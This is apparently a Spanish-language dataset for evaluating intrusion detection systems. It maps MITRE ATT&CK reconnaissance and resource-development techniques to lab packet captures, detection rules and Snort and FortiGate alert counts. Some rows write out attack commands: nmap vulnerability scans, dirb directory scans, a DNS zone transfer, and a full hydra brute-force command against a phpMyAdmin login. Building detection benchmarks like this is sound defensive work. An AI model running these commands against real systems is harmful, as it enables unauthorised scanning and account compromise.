Reconnaissance;-;TA0043;Active Scanning;T1595;Vulnerability Scanning;T1595.002;Escaneo de vulnerabilidades;nmap;T1595.002-Port_Scanning_[3].pcapng;1;1000;0;SI;Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes;Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP);Manual [3] / 3.8.2;Manual [3] / 3.8.2.4;Manual [3] / 3.8.2.5;1;1;0;1;0;1;1;0.00;48;0.05;49;0.05;53;0.05;"""El ataque consiste en la ejecución de un comando nmap que escanea los 1000 puertos más comunes. Snort detecta que se esta realizando un analisis con nmap de puertos (SID 2009358) . Además, detecta posibles escaneo en diferentes rangos de puertos. Ejemplo: SID 2002910. Para el caso de FortiGate, sólo saltan 19 alertas, cada una avisando de un intento de descubrimiento de puerto particular""";19;0.02;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;Dirb;T1595.003-Web_page_scanning1_[2].pcapng;1;101;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb http://IP -w /usr/share/dirb/wordlist/vulns/apache.txt);Manual [2] / 3.1.1.1;Manual [2];Manual [2] / 4.1.1.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;El diccionario utilizado comprueba 101 rutas diferentes.;0;0.00;1
Reconnaissance;-;TA0043;Active Scanning;T1595;Wordlist Scanning;T1595.003;Escaneo de página web;GoBuster;T1595.003-Web_page_scanning2_[3].pcapng;1;4614;0;SI;Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor;Ejecucion de comando GoBuster para escaneo de la estructura de directorios;Manual [3] / 3.8.4;Manual [3] / 3.8.4.4;Manual [3] / 3.8.4.5;1;1;0;1;0;1;43;0.01;57;0.01;62;0.01;74;0.02;"""El diccionario utilizado comprueba 4614 rutas diferentes. Snort detecta el acceso e intento de acceso a diferentes rutas, lo que puede llegar a indicar un posible ataque de estas características pero no detectaría todas las rutas. Para el caso de FortiGate, tan sólo se detecta el intento concreto de acceder al fichero .htpasswd, lo cual sólo abarca una de las instancias""";1;0.00;1
Reconnaissance;-;TA0043;Search Open Technical Databases;T1596;DNS/Passive DNS;T1596.001;Transferencia de zona DNS;Dirb;T1596.001-DNS_Transfer_[2].pcapng;1;1;0;SI;"""Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes ""Question"" igual a 1 y el resto a cero. Además, el campo ""Type"" debe tomar el valor ""00 FC""""";Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP);Manual [2] / 3.1.1.2;Manual [2];Manual [2] / 4.2.1.2;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Reconnaissance;-;TA0043;Phishing for Information;T1598;Spearphishing Link;T1598.003;Recogida de información de la víctima mediante ingeniería social;SEToolKit;T1598.003_Spearphishing_Link_[5].pcapng;1;1;0;NO;Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos;"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.1.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Reconnaissance;-;TA0043;Gather Victim Identity Information;T1589;Email Addresses;T1589.002;Recogida de cuentas de correo eléctronico y validación de las mismas;"""theHarvester, bulk-email-verifier""";T1589.002-Gather_victim_identity_information_[4].pcapng;1;1;0;SI;"""Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.""";-;Manual [4] / 3.1;Manual [4] / B.1;Manual [4] / 4.1;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Resource Development;-;TA0042;Compromise Accounts;T1586;Social Media Accounts;T1586.001;Fuerza bruta para acceso a web;Hydra;T1586.001_[2].pcapng;1;1;0;SI;Regla genérica que detecte el envío de una contraseña sobre el cuerpo de una petición HTTP POST.;"Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form ""/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server""";Manual [2] / 3.1.2.1;Manual [2];Manual [2] / 4.2.1.3;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Resource Development;-;TA0042;Establish Accounts;T1585;Social Media Accounts;T1585.001;Creación de cuentas de redes sociales;"""Sitios web convencionales (Facebook, Github, Microsoft ...)""";T1585.001-Establish_social_accounts_[4].pcapng;1;1;0;NO;"""Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.""";-;Manual [4] / 3.2;Manual [4] / B.2;Manual [4] / 4.2;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Envenenamiento de Caché DNS;ettercap;T1584-Cache_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.5;Manual [1] / E.16;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Resource Development;-;TA0042;Compromise Infrastructure;T1584.002;DNS Server;T1584.002;Secuestro / Redireccionamiento DNS;ettercap;T1584-Secuestro_dns_[1].pcapng;1;1;0;NO;"""Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no""";-;Manual [1] / 2.4.1.1.4;Manual [1] / E.15;-;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
